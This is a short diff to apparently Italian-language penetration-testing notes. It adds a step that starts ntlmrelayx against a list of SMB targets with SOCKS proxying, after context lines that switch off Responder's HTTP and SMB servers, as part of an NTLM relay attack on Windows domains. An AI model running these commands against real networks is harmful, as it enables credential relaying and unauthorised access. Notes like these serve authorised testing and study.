@@ -66,6 +66,10 @@ sudo sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf && cat /etc
 ```bash
 sudo sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf && cat /etc/responder/Responder.conf | grep --color=never 'SMB ='
 ```
+Poi si starta ntlmrelayx
+```bash
+ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks
+```
 ### **USER ENUM(W\ CREDS)**
 Per ottenere tutti gli User di un dominio avendo un account a disposizione
 ```bash
